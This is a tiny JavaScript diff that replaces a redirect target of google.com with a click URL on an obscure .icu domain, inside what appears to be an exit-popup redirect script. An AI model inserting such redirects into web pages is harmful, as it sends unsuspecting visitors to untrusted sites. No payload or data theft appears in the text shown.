@@ -1,4 +1,4 @@
-var afurl = 'https://www.google.com/';
+var afurl = 'https://pields-ladayeast.icu/click';
 
 function goto(){
 	PreventExitPop = false;
